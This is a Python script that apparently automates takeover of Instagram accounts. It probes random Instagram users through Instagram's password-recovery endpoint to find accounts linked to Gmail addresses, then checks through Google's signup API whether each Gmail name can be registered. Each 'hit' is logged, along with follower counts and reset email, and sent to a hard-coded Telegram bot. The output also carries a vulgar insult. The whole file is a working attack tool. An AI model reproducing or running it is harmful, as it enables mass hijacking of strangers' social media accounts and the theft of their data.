
import asyncio
import aiohttp
import aiofiles
import datetime
import pytz
import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
import webbrowser
from collections import deque
import threading
from queue import Queue
import signal
import multiprocessing as mp

# Initialize colorama
init(autoreset=True)

# Configuration constants
MAX_WORKERS = min(100, (os.cpu_count() or 1) * 10)  # Adaptive thread count
BATCH_SIZE = 50  # Batch file writes
REQUEST_TIMEOUT = 10
MAX_RETRIES = 3
BACKOFF_FACTOR = 0.3
RATE_LIMIT_DELAY = 0.1  # Seconds between requests

# API URLs and constants
INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
INSTAGRAM_GRAPHQL_URL = 'https://www.instagram.com/api/graphql'
GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
TELEGRAM_API_URL = f"https://api.telegram.org/bot8318025596:AAHoRYdBcq2ZvvfNOA_moasrJhopLpph9t0/sendMessage"

# Headers and constants
IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
DEFAULT_USER_AGENT = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')

TOKEN_FILE = 'tl.txt'
HITS_FILE = 'hits.txt'
eizon_domain = '@gmail.com'

# Color codes (optimized)
COLORS = {
    'C1': '\x1b[38;5;120m', 'P1': '\x1b[38;5;150m', 'J21': '\x1b[38;5;204m',
    'Z': '\x1b[1;31m', 'P': '\x1b[1;97m', 'B': '\x1b[1;37m'
}

# Global statistics with thread-safe counters
class ThreadSafeCounter:
    def __init__(self):
        self._value = 0
        self._lock = threading.Lock()

    def increment(self):
        with self._lock:
            self._value += 1
            return self._value

    @property
    def value(self):
        return self._value

# Initialize counters
stats = {
    'total_hits': ThreadSafeCounter(),
    'hits': ThreadSafeCounter(),
    'bad_insta': ThreadSafeCounter(),
    'bad_email': ThreadSafeCounter(),
    'good_ig': ThreadSafeCounter()
}

# Thread-safe data structures
infoinsta = {}
infoinsta_lock = threading.Lock()
write_queue = Queue()
last_update = 0

# Session pool for connection reuse
class SessionPool:
    def __init__(self, pool_size=20):
        self.sessions = deque()
        self.lock = threading.Lock()

        # Create session pool with retry strategy
        retry_strategy = Retry(
            total=MAX_RETRIES,
            backoff_factor=BACKOFF_FACTOR,
            status_forcelist=[429, 500, 502, 503, 504],
        )

        for _ in range(pool_size):
            session = requests.Session()
            adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=20)
            session.mount("http://", adapter)
            session.mount("https://", adapter)
            self.sessions.append(session)

    def get_session(self):
        with self.lock:
            if self.sessions:
                return self.sessions.popleft()
            else:
                # Create new session if pool is empty
                session = requests.Session()
                retry_strategy = Retry(total=MAX_RETRIES, backoff_factor=BACKOFF_FACTOR)
                adapter = HTTPAdapter(max_retries=retry_strategy)
                session.mount("http://", adapter)
                session.mount("https://", adapter)
                return session

    def return_session(self, session):
        with self.lock:
            if len(self.sessions) < 20:  # Don't let pool grow too large
                self.sessions.append(session)

session_pool = SessionPool()

def update_stats():
    global last_update
    current_time = time.time()
    if current_time - last_update >= 0.1:  # Update every 100ms max
        sysdontwrite = (f"\r{COLORS['C1']}𝐡𝐢𝐭𝐬{COLORS['P1']} : {stats['hits'].value}{COLORS['J21']} |"
                       f"{COLORS['Z']} Bad IG{COLORS['P']} : {COLORS['J21']}{stats['bad_insta'].value}{COLORS['P']} | "
                       f"{COLORS['Z']}Bad Email{COLORS['B']} : {COLORS['J21']}{stats['bad_email'].value}{COLORS['Z']} | "
                       f"{COLORS['P']}𝐆𝐨𝐨𝐝{COLORS['Z']} : {COLORS['J21']}{stats['good_ig'].value}")
        sys.stdout.write(sysdontwrite)
        sys.stdout.flush()
        last_update = current_time

class BatchWriter:
    def __init__(self, filename, batch_size=BATCH_SIZE):
        self.filename = filename
        self.batch_size = batch_size
        self.buffer = []
        self.lock = threading.Lock()

    def write(self, data):
        with self.lock:
            self.buffer.append(data)
            if len(self.buffer) >= self.batch_size:
                self._flush()

    def _flush(self):
        if self.buffer:
            with open(self.filename, 'a', encoding='utf-8') as f:
                f.writelines(self.buffer)
            self.buffer.clear()

    def flush(self):
        with self.lock:
            self._flush()

batch_writer = BatchWriter(HITS_FILE)

def optimized_eizon():
    """Optimized version of Eizon function with better error handling"""
    session = session_pool.get_session()
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))

        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'user-agent': generate_user_agent()
        }

        recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")

        res1 = session.get(recovery_url, headers=headers, timeout=REQUEST_TIMEOUT)
        res1.raise_for_status()

        tok_match = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        )
        if not tok_match:
            return False

        tok = tok_match.group(2)
        cookies = {'__Host-GAPS': host}

        headers2 = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': GOOGLE_ACCOUNTS_URL,
            'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            'user-agent': generate_user_agent()
        }

        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }

        response = session.post(
            f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
            cookies=cookies, headers=headers2, data=data, timeout=REQUEST_TIMEOUT
        )
        response.raise_for_status()

        token_line = response.text.split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict().get('__Host-GAPS', host)

        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")

        return True

    except Exception as e:
        print(f"Error in optimized_eizon: {e}")
        return False
    finally:
        session_pool.return_session(session)

def optimized_check_gmail(email):
    """Optimized Gmail checking with connection reuse"""
    session = session_pool.get_session()
    try:
        if '@' in email:
            email = email.split('@')[0]

        if not os.path.exists(TOKEN_FILE):
            if not optimized_eizon():
                return False

        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().strip()

        if '//' not in token_data:
            if not optimized_eizon():
                return False
            with open(TOKEN_FILE, 'r') as f:
                token_data = f.read().strip()

        tl, host = token_data.split('//', 1)
        cookies = {'__Host-GAPS': host}

        headers = {
            'authority': 'accounts.google.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf': '1',
            'origin': GOOGLE_ACCOUNTS_URL,
            'referer': f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            'user-agent': generate_user_agent()
        }

        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")

        response = session.post(
            f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
            params=params, cookies=cookies, headers=headers, 
            data=data, timeout=REQUEST_TIMEOUT
        )
        response.raise_for_status()

        if '"gf.uar",1' in response.text:
            stats['hits'].increment()
            update_stats()
            full_email = email + eizon_domain
            username, domain = full_email.split('@')
            optimized_info_acc(username, domain)
            return True
        else:
            stats['bad_email'].increment()
            update_stats()
            return False

    except Exception as e:
        stats['bad_email'].increment()
        update_stats()
        return False
    finally:
        session_pool.return_session(session)

def optimized_check_instagram(email):
    """Optimized Instagram checking"""
    session = session_pool.get_session()
    try:
        ua = generate_user_agent()
        device_id = 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        uui = str(uuid.uuid4())

        headers = {
            'user-agent': ua,
            'cookie': COOKIE_VALUE,
            'content-type': 'application/x-www-form-urlencoded'
        }

        data = {
            'signed_body': ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                          json.dumps({
                              '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                              'adid': uui,
                              'guid': uui,
                              'device_id': device_id,
                              'query': email
                          }, separators=(',', ':'))),
            'ig_sig_key_version': '4'
        }

        response = session.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()

        if email in response.text:
            if eizon_domain in email:
                optimized_check_gmail(email)
            stats['good_ig'].increment()
            update_stats()
            return True
        else:
            stats['bad_insta'].increment()
            update_stats()
            return False

    except Exception as e:
        stats['bad_insta'].increment()
        update_stats()
        return False
    finally:
        session_pool.return_session(session)

def optimized_rest(user):
    """Optimized rest function with better error handling"""
    session = session_pool.get_session()
    try:
        headers = {
            'X-Pigeon-Session-Id': str(uuid.uuid4()),
            'X-Pigeon-Rawclienttime': str(int(time.time() * 1000)),
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'user-agent': ('Instagram 100.0.0.17.129 Android (29/10; 420dpi; '
                          '1080x2129; samsung; SM-M205F; m20lte; exynos7904; '
                          'en_GB; 161478664)'),
            'Accept-Language': 'en-GB, en-US',
            'cookie': COOKIE_VALUE,
            'content-type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive'
        }

        data = {
            'signed_body': ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'
                           f'{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",'
                           f'"adid":"{uuid.uuid4()}",'
                           f'"guid":"{uuid.uuid4()}",'
                           f'"device_id":"android-{hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]}",'
                           f'"query":"{user}"}}'),
            'ig_sig_key_version': '4'
        }

        response = session.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()

        result = response.json()
        return result.get('email', 'Reset None')

    except Exception:
        return 'Reset None'
    finally:
        session_pool.return_session(session)

def get_account_date(user_id):
    """Optimized date calculation"""
    try:
        user_id = int(user_id)
        date_ranges = [
            (1279000, 2010), (17750000, 2011), (279760000, 2012),
            (900990000, 2013), (1629010000, 2014), (2500000000, 2015),
            (3713668786, 2016), (5699785217, 2017), (8597939245, 2018),
            (21254029834, 2019)
        ]

        for upper, year in date_ranges:
            if user_id <= upper:
                return year
        return 2023
    except (ValueError, TypeError):
        return 'Unknown'

def optimized_info_acc(username, domain):
    """Optimized account info processing with batch writing"""
    with infoinsta_lock:
        account_info = infoinsta.get(username, {})

    user_id = account_info.get('pk', 'Unknown')
    full_name = account_info.get('full_name', 'N/A')
    followers = account_info.get('follower_count', 0)
    following = account_info.get('following_count', 0)
    posts = account_info.get('media_count', 0)
    bio = account_info.get('biography', 'N/A')[:100]  # Truncate bio
    is_business = account_info.get('is_business', False)

    # Optimized calculations
    meta_enabled = "Yes" if posts >= 4 and followers >= 50 else "No"
    business_status = "Business" if is_business else "Personal"
    account_date = get_account_date(user_id)
    reset_info = optimized_rest(username)

    total_hits = stats['total_hits'].increment()

    info_text = f"""═════════════════
𝐇𝐈𝐓 :  {total_hits}  
𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄 :  {username} 
𝐄𝐌𝐀𝐈𝐋 :  {username}@{domain} 
𝐅𝐎𝐋𝐋𝐎𝐖𝐄𝐑𝐒: {followers}  
𝐅𝐎𝐋𝐋𝐎𝐖𝐈𝐍𝐆: {following}  
𝐏𝐎𝐒𝐓𝐒 : {posts}  
𝐃𝐀𝐓𝐄 : {account_date}  
𝐁𝐈𝐎 : {bio}  
𝐌𝐄𝐓𝐀 𝐄𝐍𝐀𝐁𝐋𝐄𝐃 : {meta_enabled}  
𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐘𝐏𝐄 : {business_status}  
𝐑𝐄𝐒𝐓 : {reset_info}
ARYAN KI BUND MEIN BADA CHED
\n"""

    # Batch write to file
    batch_writer.write(info_text)

    # Send to Telegram (async)
    threading.Thread(target=send_to_telegram, args=(info_text,), daemon=True).start()

def send_to_telegram(message):
    """Send message to Telegram bot with retry logic"""
    session = session_pool.get_session()
    try:
        params = {
            'chat_id': 8034717776,
            'text': message[:4096]  # Telegram message limit
        }
        response = session.get(TELEGRAM_API_URL, params=params, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()
    except Exception:
        pass  # Ignore telegram errors to not slow down main process
    finally:
        session_pool.return_session(session)

def optimized_fetch_instagram_data():
    """Optimized Instagram data fetching with better performance"""
    session = session_pool.get_session()
    try:
        # Generate random data more efficiently
        lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        user_id = random.randrange(17750000, 279936916)

        data = {
            'lsd': lsd,
            'variables': json.dumps({
                'id': user_id,
                'render_surface': 'PROFILE'
            }, separators=(',', ':')),
            'doc_id': '25618261841150840'
        }

        headers = {
            'X-FB-LSD': lsd,
            'user-agent': generate_user_agent(),
            'content-type': 'application/x-www-form-urlencoded',
            'x-requested-with': 'XMLHttpRequest'
        }

        response = session.post(INSTAGRAM_GRAPHQL_URL, headers=headers, data=data, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()

        result = response.json()
        account = result.get('data', {}).get('user', {})
        username = account.get('username')

        if username and account.get('pk'):
            # Thread-safe update of infoinsta
            with infoinsta_lock:
                infoinsta[username] = account

            # Check the account
            email = username + eizon_domain
            optimized_check_instagram(email)

        # Add small delay to avoid rate limiting
        time.sleep(RATE_LIMIT_DELAY)

    except Exception as e:
        pass  # Continue on errors
    finally:
        session_pool.return_session(session)

def worker_thread():
    """Optimized worker thread function"""
    while True:
        try:
            optimized_fetch_instagram_data()
        except Exception:
            time.sleep(1)  # Brief pause on error

def signal_handler(signum, frame):
    """Handle graceful shutdown"""
    print("\nShutting down gracefully...")
    batch_writer.flush()
    sys.exit(0)

def main():
    """Main function with optimized performance"""
    # Set up signal handling
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Print banner
    banner = render('Joker randi', colors=['white', 'blue'], align='center')
    print(banner)

    # Initialize token
    if not os.path.exists(TOKEN_FILE) or os.path.getsize(TOKEN_FILE) == 0:
        print("Initializing token...")
        optimized_eizon()

    print(f"Starting {MAX_WORKERS} optimized worker threads...")

    # Start worker threads with ThreadPoolExecutor for better management
    with ThreadPoolExecutor(max_workers=MAX_WORKERS, thread_name_prefix="Worker") as executor:
        # Submit all worker tasks
        futures = [executor.submit(worker_thread) for _ in range(MAX_WORKERS)]

        try:
            # Wait for completion (they run indefinitely)
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Worker thread error: {e}")
                    # Restart failed thread
                    executor.submit(worker_thread)
        except KeyboardInterrupt:
            print("\nReceived interrupt signal...")
        finally:
            batch_writer.flush()
            print("Cleanup complete.")

if __name__ == "__main__":
    main()
